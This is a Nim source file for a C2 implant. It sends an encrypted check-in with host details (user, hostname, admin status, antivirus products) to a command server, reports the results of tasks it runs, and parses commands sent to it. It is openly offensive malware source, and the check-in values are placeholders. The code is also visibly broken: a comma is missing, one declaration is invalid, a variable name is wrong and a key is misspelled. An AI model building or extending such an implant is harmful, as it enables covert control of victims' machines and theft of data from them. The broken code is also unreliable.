import httpclient, json, strformat
import config, crypto
import times
import std/parseutils

let client = newHttpClient()

proc sendCheckin*(id: string): string =
    let checkin_payload = %*{
      "id": id, #agent's id
      "user": "kali",
      "hostname": "kali", #name of the host in whcih the agent is residing
      "os_version": "1.2.3",
      "os_build": "327.112.1",
      "architecture": "x64",
      "process_id": "12323",
      "process_name": "beacon",
      "internal_ip": "127.0.0.1",
      "external_ip": "127.0.0.1",
      "domain": "workgroup",
      "is_admin": "no",
      "av_products":"defender",
      "beacon_start_time":  now(),
      "first_checkin": now(),
      "implant_version": IMPLANT_VERSION,
      "beacon_key": PER_BEACON_KEY,
      "timestamp": now() #like last seen or last activity
      "status": "Active"
    }

    key : seq[byte]

    #if now() > checkin_payload["first_checkin"]:
      #key = hexToBytes(PER_BEACON_KEY)
    #else:
      #key = hexToBytes(AES_KEY)

    key = hexToBytes(AES_KEY)

    let enc = encryptJson($payload, key)
    return client.postContent(C2_URL & CHECKIN_URI, enc) #post request http://127.0.0.1:8080/checkin with enc as body
    #in backend getNextTask(id) -> return the task for the agent as (task_id,cmd)

proc sendTaskResult*(id: string, task_id: string,command: string,result: string): string =
    let payload = %*{
      "agent_id": id,
      "task_id": task_id,
      "command": command,
      "data": result
    }
    let enc = encryptJson($payload, hexToBytes(AES_KEY))
    return client.postContent(C2_URL & RESULT_URI, enc)

type Task = object
    task_id: string
    command: string

proc parseTask*(raw: JsonNode): Task =
    #j["task_id"]
    result.task_id = raw["task_id"].getStr()
    result.command = raw["commad"].getStr()
